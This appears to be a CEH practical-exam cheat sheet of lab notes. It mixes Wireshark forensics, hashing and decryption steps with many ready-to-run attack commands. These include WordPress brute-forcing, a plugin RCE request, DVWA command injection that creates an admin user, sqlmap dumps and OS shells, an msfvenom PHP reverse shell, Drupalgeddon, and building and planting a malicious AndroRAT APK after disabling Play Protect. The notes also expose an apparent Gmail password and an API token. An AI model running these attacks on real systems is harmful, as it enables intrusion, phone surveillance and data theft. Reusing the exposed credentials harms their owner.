Here, -m 2500 specifies WPA2, -a 0 specifies dictionary attack, and -w 3 sets the workload for Hashcat. 
The .hccapx file is the handshake file converted into Hashcat's format.

https://github.com/cmuppin/CEH/blob/main/Cryptography
-----------------------------------------------------------------------------------------------------------
Crack / find the credentials on http from a pcapng file Wireshark:

http.request.method == POST

*Look FOR THE FIRST HTTP POST then other if not accepted
apply as filter - select http (protocol)
_ws.col.protocol == "HTTP"
then apply as filter - http.request.method == POST
Post /login.aspx
lee/test

POST / HTTP/1.1
kety/apple

-----------------------------------------------------------------------------------------------------------
Determine the ip of the victim in 172.30.10.0/24 via wireshark file:

Statistics IPv4 Statistics - All Addresses
look for Count higher packets is the one
172.30.10.200
*Make sure it's the destination / victim ip not the source / attacker

-----------------------------------------------------------------------------------------------------------
Determine the ip of the hacker using RPC service via wireshark file:

via Wireshark - Statistics - Conversations - TCP Tab will show port 135 and attacker ip
or
tcp.dstport == 135
Check source ip = attacker

-----------------------------------------------------------------------------------------------------------
Determine the ip of the hacker using UDP service via wireshark file:

ip.proto == 17 or type in filter = udp
Check source ip (will be the attacker)
-----------------------------------------------------------------------------------------------------------

# Determine the UDP based application layer protocol which attacker employed to flood the machine: 

Wireshark - Preferences → Name Resolution → Resolve transport names check (to resolve port # to name)
Wireshark - Statistics - Conversations - UDP Tab
Wireshark - Statistics - IPV4 Statistics - Source and IP Address
Check destination port
udp port 26000 flooding

Quake Network Protocol (UDP Port 26000)
other UDP based application layer protocol could be:
VoIp (UDP 5060)
NetBIOS (UDP 137,8,9)
CharGen (UDP 19)
SNMPv2 (UDP 161)
QOTD (UDP 17)
RPC (UDP 135)
SSDP (UDP 1900)
CLDAP (UDP 389)

-----------------------------------------------------------------------------------------------------------
Determine the attacker ip on report.txt (from Anti-Ddos Guardian) which has transmitted more numbers of packets to target:

*check for the remote ip address as it is a report concatenated report export

check for Incoming Bytes higher + many times for same ip = 192.168.10.222
*check for UDP port high = 58777 + 54886
*check for high incoming (Blocked) packets
-----------------------------------------------------------------------------------------------------------

A RAT server is installed on a server. Connect with it and access the file secret:
nmap -p- 192.168.X.X   # Replace with the target IP address
nmap -p 5555 192.168.X.X --open
adb connect 192.168.10.121:5555
adb shell
su
cd /sdcard
find /sdcard -name "secret"
find /sdcard -iname "secret*"
cp /path/to/secret /tmp/secret_copy
dir /a:h (hidden files w2k)
-----------------------------------------------------------------------------------------------------------
Decrypt the veracrypt volume:

Click on "Select File...": This allows you to browse for the encrypted VeraCrypt volume (the .hc or .veracrypt file)
Mount the Volume
Choose a drive letter to mount the volume to.
Click "Mount": This will prompt you for the password (and keyfile, if applicable).
Enter the Password and Keyfile
Enter the password used to encrypt the volume.
If a keyfile was used, click on "Keyfiles", browse to the location of the keyfile, and select it.
Click OK: If the password and keyfile (if applicable) are correct, VeraCrypt will mount the volume and assign it to a drive letter.

-----------------------------------------------------------------------------------------------------------

hash comparaison, which file is the original which one's are the tampered one's:
Generate Hashes for Each File

sha256sum Tools.rar (d282) or upload to virus total to get hashes for multiple
sha256sum filename2

or on windows
CertUtil -hashfile filename1 SHA256
CertUtil -hashfile filename2 SHA256

Compare the Hash Values

For example:

File 1 (Original): abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
File 2 (Tampered): abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567891
The last character differs, indicating that File 2 has been modified.

Identify the Original File:

sha256sum file1 file2 file3 > checksums.txt

Check for File Integrity

OpenSSL (cross-platform): Can be used for various hash algorithms.
HashCalc (Windows): A graphical tool to compute file hashes.
FileVerifier++ (Windows): A tool that compares file hashes and can identify tampered files based on known hash values.
-----------------------------------------------------------------------------------------------------------

-Determine the last 4 digits SHA-256 hash value of the file Tools.rar :

sha256sum Tools.rar
-----------------------------------------------------------------------------------------------------------
-Enumerate and hack a web app using wpscan and metasploit:

wpscan --usernames james -P password.txt --url http://192.168.0.222:8080/CEH/
wpscan --usernames james -P rockyou.txt --url http://192.168.0.222:8080/CEH/ 
wpscan --usernames james -P rockyou.txt --url http://192.168.0.222:8080/CEH/ --plugins-detection aggressive --enumerate u
wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u

*scan found RCE for plugin: wp-upg
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'

msfconsole

use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE password.txt
set RHOST 10.10.10.16
set RPORT 8080
set TARGETURI http://10.10.10.16:8080/CEH
set USERNAME admin
run
-----------------------------------------------------------------------------------------------------------

Exploit a RCE to compromise a target web server (DVWA Low security):

| hostname
| whoami
| dir C:\
| net user
| net user user001 /Add
| net user user001
| net localgroup Administrators user001 /Add
now you can use user001 to log in remote
-----------------------------------------------------------------------------------------------------------

SQL Injection Attack find the total numbers of users in the database:

Login a website with a valid user or use OWASP ZAP and find Alerts SQL Injection (found Parameters txtpwd) + WASC ID
user = admin or whatever
password= ZAP' OR '1'='1' --
(CWE ID = 89 + WASC ID = 19 are the results from OWASP ZAP)

*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=1
then f12 - Console - document.cookie
"mscope=1jWydNf8wro=; ui-tabs-1=0"
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Login -dump
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --os-shell

or try by id:
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=1
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=2
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=3
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=4
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=5
*Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=6 (nothing so 5 users)

on DVWA:

Go to SQL Injection and enter = ' or 1=1#
or: if user & pass given
F12 - Console - document.cookie
sqlmap -u http://xxxx/sql/?idxxxxxx=Submit--cookie "security=low; PHPSESSIONID=121121212" --dbs

or: use Burpsuite
Intercept ON - browse DVWA http://xxxx/sql/?idxxx - see result GET 
copy request on the bottom = right-click = copy to file  - save to sql.txt

sqlmap -r sql.txt --dbs
sqlmap Y upper case say yes N upper
sqlmap -r sql.txt --dbs --batch (don't have to put Y or N)
sqlmap -r sql.txt -D dvwa --dump
-----------------------------------------------------------------------------------------------------------

Android ADB & phonesploit: will be installed in the root folder, if you don't find use the command like "find phonesploit".

find /home/user1/ -iname "phone*"
python3 /home/user1/PhoneSploit-Pro/phonesploitpro.py

adb connect 192.168.10.121:5555 or PhoneSploit-Pro adb shell integrated
adb shell
su -
ls
exit
adb shell pm list packages -3 -f   (to list unoffcial apk installed)
pm list packages -3 -f (from PhoneSploit-Pro adb shell integrated) 
adb pull data/app/com.cxinventor.xxxxxxx==/base.apk .  (do download apk locally to analyze)
crc32 base.apk
53ac614c

find . -type f -name "*.apk" -exec crc32 {} \;

#-Android call logs, find phising number PhoneSploit-Pro:
adb shell
x86_64:/$ su
cd /sdcard/Calls
cat call-logs.txt
look for bank - ssn number asked

*Below permissions denied....:
x86_64:/$ cp /data/data/com.android.providers.contacts/databases/calllog.db /sdcard/
exit
adb pull /sdcard/calllog.db
sqlite3 calllog.db "SELECT * FROM calls LIMIT 10;"

cd ~/PhoneSploit-Pro
python3 phonesploitpro
1- connect a Device
192.168.10.121
15- Meterpreter
dump_contacts
dump_calllog
dump_sms
app_list
sysinfo
--------------------------------------------------------------------------------------------------------------------------------------
-njRAT on windows default port 5553 sometime 5552
nmap -p 5553 --open 192.168.10.0/24
nmap -p- --open 192.168.10.0/24
if does not work njrat change default port 5553 to the one found above

-ProRat gui windows default port 5110 - click connect (password provided if not switch to njrat, httprat..)

-theef rat client on windows to connect port 6703

-httprat client windows specify server port, default is port 80 change to 8090 then build will create a httpserver.exe - send it to victim
once victim execute it: http://victim.ip:8090

-AndroRAT: create apk malicious for reverse shell: default port 8000

python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (listen and wait for client connection by installing evil.apk)
*On Android victim browse http://192.168.31.247/share/evil.apk and install it, then attcker should have shell androRAT.

python3 androRAT.py --build -i 192.168.31.188 -p 8000 -o evil.apk
copy apk to victim Android via your http hosted web server:
mkdir /var/www/html/share
chmod -755 /var/www/html/share
chown -R 755 /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
service apache2 start / restart
cp evil.apk /var/www/html/share
adb install evil.apk
*If adb install -g evil.apk failed click on PlayStore - Play Protect - Gears/settings - disable both Scan + Harmful:
adb install -r myapp.apk  (-r reinstall keep data) or install via GUI

*Install apk manually
adb install -g evil.apk   (-g grant all runtime permissions automatically)
adb install -r -g myapp.apk  (-r reinstall keep data)

*If adb install -g evil.apk failed click on PlayStore - Play Protect - Gears/settings - disable both Scan + Harmful
*not mandatory to login, click well to disable both Scan + Harmful
Wmax25246@gmail.com
TheSkyIsBlue2020$

python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (start listening on attacker):
Interpreter:/> help

    getSMS inbox 	
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device

lsof | more
lsof | grep call
lsof -p pid
-----------------------------------------------------------------------------------------------------------

-Identify the algorithm used for file encryption and hidden text cryt-128-06encr.hex containing ransom file password:
Twofish/@!ph@|tE*t

copy cryt-128-06encr.hex from PArrot to Windows and use cryp tool to Identify the algorithm used
Twofish = 128 bites block size for the key
-CT1 Algorithm ID Mapping (commonly used table) Based on CT1 documentation & export format:
cryp tool when save will add  below:
01 → DES (56-bit)
02 → Triple-DES (3DES, 168-bit)
03 → IDEA
04 → Blowfish
05 → RC4
06 → Twofish     - cryt-128-06encr.hex
07 → AES-128
08 → AES-192
09 → AES-256
10 → RSA (public key)

-If the key is not given, GUESS based on name of the algorithms 06 → Twofish and it's 128 bites block size for the key (32 characters)
06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06

-same if RC4 guess the key 05 05 05....or to find encryption:

Click on cryp tool - Analysis - Symetric Encryption (modern) - RC4 - Key lengh: 8 to 16 bits - Start - result could be the secret...

----------------------------------------------------------------------------------------------------------------------------
-TO Decrypt OPEN VeraCrypt click Volume - select file (im my docs) select drive M: and click MOUNT - AND PUT THE password given
*VeraCrypt file is located in the instructions or my Documents File - open
*If VeraCrypt file is on Linux / Parrot copy it via explorer smb:// then on Windows VeraCrypt click Volume - select file...

---------------------------------------------------------------------------------------------------------------------------
-You are assigned a task to attain KEYCODE-5 used in the employees mobile phone: 

use option N in PhoneSploit for next page and go to KEYCODE / 34 if i remember and answer is Power Button
-----------------------------------------------------------------------------------------------------------------------------------------

-you have obtained a screenshot of the attack using a background application: 
Retrieve the screenshot of the attack using PhoneSploit (better to use adb shell or adb shell via phonesploit)
determine the number of HTTP packets sent per second that shows in the image.png (zoom to make sure of the # = 23)
adb pull /sdcard/Music/xxx.png
Via explorer open it

*option 6 on PhoneSploit-Pro downloaded a black screenshot so search via adb shell
-----------------------------------------------------------------------------------------------------------------------------------------

-check the integrity of the files by comparing the MD5 hashes:
Compare the hash values and determine the file name that has been tampered with
md5sum Quotes.txt   (compare with original md5 hash file)

-----------------------------------------------------------------------------------------------------------------------------------------
-He has requested a specific number of risk categories. The required HTML file is located on EH 1 otherwise wapiti www:

apt-get install wapiti
wapiti -u http://www.good.com
$Firefox /root/.wapiti/generated_report/wwwxxxxxxx.html

Check ho many categories on the right have one or more vulnerabilities = 3
1 for Content Security Policy (to detect Cross-Site Scripting (XSS)
1 for Clickjacking protection
1 for MIME type confusion

--------------------------------------------------------------------------------------------------------------------------------------
-Decrypt file crypto forge (on windows - right click - decrypt): .cfe extensions

(on windows cryptoforge - right click on the file - decrypt - enter password or press enter if no password)
-----------------------------------------------------------------------------------------------------------------------------------------

-Windows get file hash via powershell:

Get-FileHash -Algorithm SHA256 .\secret.txt

-----------------------------------------------------------------------------------------------------------------------------------------
-File transfer Parrot to Windows:

smb://xxxxxx via explorer
or:
filetransfer.io
or:
python3 -m http.server 8000 (other pc http://x.x.x.x:8000 and you can download)
or:
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share/
chown -R www-data:www-data /var/www/html/share/
cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
service apache2 start  (then (other pc http://x.x.x.x/share)

-----------------------------------------------------------------------------------------------------------------------------------------
# find CMS type, version, exploit: https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/drupal/


whatweb http://192.168.0.222:8080
whatweb http://192.168.0.222:8080/CEH
whatweb http://192.168.0.222:8080/DVWA

cmsmap http://192.168.0.222 (Wordpress + Joomla + Drupal)
cmsmap http://192.168.0.222:8080/CEH/wp-login

http://192.168.0.222:8080/CEH/wp-json/wp/v2/users
http://192.168.0.222:8080/CEH/wp-json/wp/v2/users/1
http://192.168.0.222:8080/CEH/wp-json/wp/v2/users/2 (if 401 exist and if 404 does not exist)

droopescan scan -u http://192.168.0.222
https://github.com/SamJoan/droopescan

msfconsole
search durpal
use exploit/multi/http/drupal_drupageddon
options
show options
run
meterpreter > ? or sysinfo or getuid or getpid or shell
-----------------------------------------------------------------------------------------------------------------------------------------
File upload via DVWA to have a reverse shell:

msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=444 -o shell.php
in parralel before uploading:
msfconsole -x "use exploit/multi/handler; set lhost 192.168.0.XX; set lport 444; set payload php/meterpreter/reverse_tcp; run"
On DVWA file upload shell.php

-----------------------------------------------------------------------------------------------------------------------------------------
IDOR vulnerability:
Insecure direct object references
https://insecure-website.com/customer_account?customer_number=132355
https://insecure-website.com/static/12144.txt
https://example.com/profile?user_id=124

https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/

-----------------------------------------------------------------------------------------------------------------------------------------
Version of pop3:
nmap -p 110 192.168.x.x -sV 
nmap --script vuln 192.168.0.x (lowest cve)

-----------------------------------------------------------------------------------------------------------------------------------------
OpenStego for .bmp:

already installed or search in CEH folder
To Decrypt - click on Extract Data - input file.bmp and output Folder = C:\temp - put pwd otherwise leave - Extract Data

-----------------------------------------------------------------------------------------------------------------------------------------
crack hashes:

https://hashes.com - https://hashes.com/en/decrypt/hash - https://crackstation.net/
john or hashcat if wordlist given otherwise above

hashcat -m 0 -a 0 hashmd5.txt /home/attacker/rockyou.txt  ( -m 0 = MD5 mode -a 0 = dictionary attack)
john --format=raw-md5 --wordlist=/home/attacker/rockyou.txt hashmd5.txt
-----------------------------------------------------------------------------------------------------------------------------------------
#Amazon bucket:

aws configure
aws s3 ls
aws s3 ls s3://certifiedhacker02 or (https to view content)
aws s3 mv Hack.txt s3://certifiedhacker02
aws s3 cp s3://certifiedhacker02/flag.txt flagdownload.txt

-----------------------------------------------------------------------------------------------------------------------------------------
Malware detection and analysis sites:

https://www.virustotal.com/

http://totalhash.com/

https://www.hybrid-analysis.com/

http://www.herdprotect.com/knowledgebase.aspx

http://www.phishtank.com/

http://md5hashing.net/hash_type_checker

https://threatcrowd.org

https://www.trendmicro.com/en_us/research.html

Web content verification sites:

https://hackvertor.co.uk/public

https://talosintelligence.com

https://urlscan.io/domain/urlquery.net

http://ipvoid.com/

http://pgl.yoyo.org/urlex/

http://www.internetofficer.com/seo-tool/redirect-check/

Network utilities:

https://www.whatismyip.com/ip-address-hostname-lookup/

http://centralops.net/co/

https://www.robtex.com/

https://dnslytics.com/ip

http://dnsviz.net/

http://www.ipaddressguide.com/cidr

Scripting utilities:

http://snarkles.net/scripts/sneak/sneak.php

http://utf-8.jp/public/jjencode.html

http://ddecode.com/phpdecoder/















